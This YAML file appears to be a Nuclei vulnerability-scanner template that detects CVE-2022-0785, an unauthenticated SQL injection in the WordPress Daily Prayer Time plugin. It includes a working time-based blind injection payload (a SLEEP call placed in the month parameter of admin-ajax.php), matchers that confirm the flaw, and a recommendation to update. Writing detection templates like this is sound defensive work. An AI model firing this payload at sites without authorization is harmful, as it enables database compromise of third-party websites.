id: CVE-2022-0785
info:
  name: WordPress Daily Prayer Time <2022.03.01 - SQL Injection
  author: theamanrawat
  severity: critical
  description: WordPress Daily Prayer Time plugin before 2022.03.01 has a SQL injection
    vulnerability, where unauthenticated users can inject SQL code into the month
    parameter of the get_monthly_timetable action via AJAX, leading to database compromise.
  reference:
  - https://wpscan.com/vulnerability/e1e09f56-89a4-4d6f-907b-3fb2cb825255
  - https://wordpress.org/plugins/daily-prayer-time-for-mosques/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0785
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0785
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in the WordPress Daily Prayer Time plugin
      can have a significant impact on the security of websites using the plugin,
      potentially allowing unauthorized access to sensitive information or even full
      compromise of the website.
    recommendation: I recommend updating to the latest version of the WordPress Daily
      Prayer Time plugin (2022.03.01 or later), as prior versions contain a significant
      SQL injection vulnerability that could be exploited by unauthenticated users.
  tags: sqli,wordpress,wp-plugin,unauth,daily-prayer-time-for-mosques,wpscan,cve,cve2022,wp
requests:
- raw:
  - '@timeout: 10s

    GET /wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "dptTimetable customStyles dptUserStyles")
    condition: and
